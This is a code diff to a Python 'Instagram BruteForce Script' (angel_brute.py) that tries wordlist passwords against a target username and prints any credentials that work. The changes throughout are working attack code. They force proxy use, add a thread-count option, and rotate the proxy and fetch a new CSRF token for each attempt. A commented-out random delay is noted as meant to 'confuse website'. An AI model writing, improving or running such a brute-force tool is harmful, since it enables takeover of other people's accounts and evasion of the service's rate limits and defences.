@@ -16,7 +16,7 @@ try:
 except ImportError:
     import queue as Queue
 
-THREAD = 50
+#THREAD = 200
 
 
 
@@ -99,6 +99,9 @@ def craft_response(username, password, csrf_token, proxy, q):
 
     try:
 
+      #sleep for random intervals to increase entropy & confuse website
+      #time.sleep(random.choice([3, 5, 10, 15, 4, 3.5, 2.5, 4.5]))
+
       if proxy is not None:
 
 
@@ -154,7 +157,7 @@ def craft_response(username, password, csrf_token, proxy, q):
             print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login "
                     + bcolors.FAIL + "But need Checkpoint :|" + bcolors.OKGREEN)
             print("---------------------------------------------------")
-            print("[!]Username: ", USER)
+            print("[!]Username: ", username)
             print("[!]Password: ", password)
             print("---------------------------------------------------\n" + bcolors.ENDC)
             found_flag = True
@@ -162,6 +165,16 @@ def craft_response(username, password, csrf_token, proxy, q):
             q.task_done()
             os._exit(1)
             return 1
+
+          else:
+            if proxy in proxys_working_list:
+
+              proxys_working_list.pop(proxy)
+            print(bcolors.OKGREEN + "[+] Online Proxy: ", str(len(proxys_working_list)) + bcolors.ENDC)
+
+            return 0
+
+          """
 
           elif proxy:
               print(bcolors.WARNING +
@@ -182,6 +195,7 @@ def craft_response(username, password, csrf_token, proxy, q):
                     " script will not work fine until you change your ip or use proxy" + bcolors.ENDC)
               #raise Exception(str(e.getcode()))
               return 0
+          """
       else:
           #print("Error:", e.getcode())
           #print ("Http Error Bloc: " + str(e.getcode()))
@@ -266,6 +280,10 @@ def check_avalaible_proxys(proxys):
 
     print(bcolors.OKGREEN + "[+] Online Proxy: " + bcolors.BOLD + str(len(proxys_working_list)) + bcolors.ENDC + "\n")
 
+    if len(proxys_working_list) == 0:
+      print ("No proxies loaded! Check your proxy file. Exiting...")
+      sys.exit(1)
+
 def check_proxy(q):
     """
     check proxy for and append to working proxies
@@ -340,9 +358,16 @@ def brute(q):
 
 
         if len(proxys_working_list) != 0:
-          proxy = random.choice(list(proxys_working_list.keys()))
 
-        result = craft_response(username, word, csrf_token, random.choice(list(proxys_working_list.keys())), q)
+          #create a new proxy and csrf_token for each request
+          proxy = random.choice(list(proxys_working_list.keys()))
+          csrf_token = get_csrf()
+
+
+          result = craft_response(username, word, csrf_token, proxy, q)
+        else:
+          print("No more proxies to work with! Exiting...")
+          sys.exit(1)
 
 
 
@@ -392,16 +417,18 @@ def starter():
 
 def get_csrf():
 
-  global csrf_token
-  csrf_token = ""
+  #global csrf_token
+  #csrf_token = ""
 
 
   #Keep making requests until a csrf token is acquired 
-  print(bcolors.WARNING + "[-] Extracting CSRF Token...\n" + bcolors.ENDC)
+  #print(bcolors.WARNING + "[-] Extracting CSRF Token...\n" + bcolors.ENDC)
 
   if len(proxys_working_list) == 0:
     print("No proxies found, exiting... ")
     sys.exit(1)
+
+  csrf_token = ""
 
   while len(csrf_token) == 0:
     try:
@@ -418,11 +445,12 @@ def get_csrf():
     except Exception as e:
       #try again
 
-      print(bcolors.WARNING + "[-] Error extracting CSRF Token, changing proxy..." + bcolors.ENDC, end="\r", flush=True)
+      #print(bcolors.WARNING + "[-] Error extracting CSRF Token, changing proxy..." + bcolors.ENDC, end="\r", flush=True)
 
       pass
 
-  print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)
+  #print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)
+  return csrf_token
 
 
 
@@ -459,7 +487,7 @@ if __name__ == "__main__":
   # Parse args
   parser = argparse.ArgumentParser(
         description="Instagram BruteForce Script",
-        epilog="python angel_brute.py -u user_test -w words.txt -p proxies.txt"
+        epilog="python angel_brute.py -u user_test -w words.txt -p proxies.txt -t 100"
     )
 
   # required argument
@@ -467,38 +495,47 @@ if __name__ == "__main__":
                   help='Target Username')
   parser.add_argument('-w', '--word', action="store", required=True,
                   help='Words list path')
-  parser.add_argument('-p', '--proxy', action="store", required=False,
+  parser.add_argument('-p', '--proxy', action="store", required=True,
                         help='Proxy list path')
+  parser.add_argument('-t', '--thread', action="store", required=True,
+                      help='Number of Threads')
 
   args = parser.parse_args()
 
-  USER = args.username
   global username
-  username = USER
+  username = args.username
+
+  global THREAD
+  THREAD = int(args.thread)
 
   try:
       #words = open(args.word).readlines()
-      words = re.findall('\w+', open(args.word, encoding='latin-1').read().lower())
+      words = re.findall('\w+', open(args.word, encoding='latin-1').read())
   except IOError:
       print("[-] Error: Check your word list file path\n")
       sys.exit(1)
 
-  if args.proxy is not None:
 
-    try:
-      proxies = open(args.proxy).readlines()
-    except IOError:
-        print("[-] Error: Check your proxy list file path\n")
-        sys.exit(1)
+  try:
+    proxies = open(args.proxy).readlines()
+  except IOError:
+      print("[-] Error: Check your proxy list file path\n")
+      sys.exit(1)
 
-    global p
-    p = open("good_proxies.txt", "w")
+  
 
-    check_avalaible_proxys(proxies)
+  check_avalaible_proxys(proxies)
 
-    for prox in proxys_working_list:
-      p.write(prox + "\n")
-    p.close()
+  if len(proxys_working_list) == 0:
+    print ("No proxies loaded! Check your proxy file. Exiting...")
+    sys.exit(1)
+
+  global p
+  p = open("good_proxies.txt", "w")
+
+  for prox in proxys_working_list:
+    p.write(prox + "\n")
+  p.close()
     
 
 
@@ -506,7 +543,7 @@ if __name__ == "__main__":
 
 
   
-  get_csrf()
+  #get_csrf()
   starter()
 
 
